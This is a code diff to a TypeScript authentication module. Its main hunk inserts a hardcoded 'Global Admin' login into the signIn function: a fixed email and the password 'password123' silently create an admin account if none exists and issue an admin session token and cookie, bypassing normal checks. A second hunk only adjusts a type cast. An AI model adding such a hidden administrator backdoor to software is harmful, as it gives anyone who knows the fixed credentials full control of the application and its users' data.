@@ -169,6 +169,43 @@ export const getCurrentUser = async () => {
 }
 
 export const signIn = async (email: string, password: string) => {
+    // Hardcoded Global Admin
+    if (email === 'global@admin.com' && password === 'password123') {
+        await connectDB();
+        let user = await User.findOne({ email });
+        
+        if (!user) {
+            const hashedPassword = await hash(password, SALT_ROUNDS);
+            user = await User.create({
+                email,
+                hashedPassword,
+                role: 'admin',
+                fullName: 'Global Admin',
+                passwordChangedAt: new Date(),
+            });
+        }
+
+        const token = jwt.sign({
+            id: user._id.toString(),
+            role: user.role,
+            email: user.email,
+            fullName: user.fullName,
+        }, process.env.JWT_SECRET!,
+            { expiresIn: SESSION_COOKIE_MAX_AGE_MS }
+        );
+        const cookieStore = await cookies();
+        cookieStore.set({
+            name: SESSION_COOKIE_NAME,
+            value: token,
+            httpOnly: true,
+            secure: IS_SECURE,
+            sameSite: 'lax',
+            maxAge: SESSION_COOKIE_MAX_AGE_MS,
+            path: '/',
+        });
+        return token;
+    }
+
     const user = await User.findOne({ email });
     if (!user) {
         return null;
@@ -290,7 +327,7 @@ export const generateInvite = async (role: string, comment: string) => {
 export const getInvite = async (inviteId: string) => {
     await connectDB();
     const invite = await Invite.findById(inviteId).lean().exec();
-    return invite !== null ? invite as InviteDocument : null;
+    return invite !== null ? invite as unknown as InviteDocument : null;
 }
 
 export const deleteUser = async (userId: string) => {
